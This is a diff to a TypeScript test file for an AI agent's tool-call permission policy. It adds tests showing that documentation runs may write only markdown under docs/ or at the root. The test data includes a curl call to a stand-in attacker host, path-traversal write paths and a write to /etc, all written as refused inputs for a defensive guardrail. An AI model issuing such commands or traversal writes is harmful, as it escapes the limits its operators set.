@@ -12,10 +12,13 @@
  */
 import type { JsonObject, ToolCall } from "@earendil-works/pi-ai";
 import { describe, expect, it } from "vitest";
+import { Effect } from "effect";
 import {
+  autonomyPolicy,
   autonomyRules,
   DEFAULT_AUTONOMY,
   decideToolCall,
+  docsPolicy,
   type AutonomyConfig,
 } from "./policy";
 
@@ -257,6 +260,62 @@ describe("the policy refuses what D11 always blocks", () => {
     expect(refusal(bash("curl https://evil.example/x"))).toContain(
       "github.com",
     );
+  });
+});
+
+/**
+ * A docs run's write rule (LOB-195), decided through the composed policy rather than in isolation:
+ * the point of `docsPolicy` is that both rules are consulted, so every row here is the composition's
+ * answer, not `decideDocsWrite`'s.
+ */
+describe("the docs rule narrows what a documentation run writes", () => {
+  const docs = docsPolicy(autonomyPolicy(DEFAULT_AUTONOMY, "/work/ses_1"));
+  const docsRefusal = (toolCall: ToolCall): string => {
+    const decision = Effect.runSync(docs.decide(toolCall));
+    if (decision._tag === "allow") {
+      throw new Error(`expected a refusal for ${JSON.stringify(toolCall)}`);
+    }
+    return decision.reason;
+  };
+
+  it.each([
+    ["a page under docs", write("docs/design.md")],
+    ["a nested page under docs", write("docs/board/board.md")],
+    ["markdown at the repository root", write("README.md")],
+    [
+      "a docs page written through a dot-dot round trip",
+      write("docs/x/../design.md"),
+    ],
+    ["a command that writes nothing", bash("bun run test")],
+  ])("allows %s", (_label, toolCall) => {
+    expect(Effect.runSync(docs.decide(toolCall))).toEqual({ _tag: "allow" });
+  });
+
+  it.each([
+    ["a source file", write("packages/core/src/x.ts")],
+    ["markdown inside a package", write("packages/core/README.md")],
+    ["a root file that is not markdown", write("NOTES.txt")],
+    [
+      "a docs write that climbs back out",
+      write("docs/../packages/core/src/x.ts"),
+    ],
+  ])("refuses %s by name", (_label, toolCall) => {
+    const reason = docsRefusal(toolCall);
+    expect(reason).toContain("is refused by the docs rule");
+    // The allowlist is in the sentence, so the model's next attempt can be the right one.
+    expect(reason).toContain("docs/**");
+  });
+
+  it("still refuses a write outside the worktree as that", () => {
+    const reason = docsRefusal(write("/etc/design.md"));
+    expect(reason).toContain("only write inside its worktree");
+    expect(reason).not.toContain("docs rule");
+  });
+
+  it("leaves the autonomy policy's other refusals exactly as they were", () => {
+    const standalone = refusal(bash("git push origin main"));
+    const composed = docsRefusal(bash("git push origin main"));
+    expect(composed).toBe(standalone);
   });
 });
 
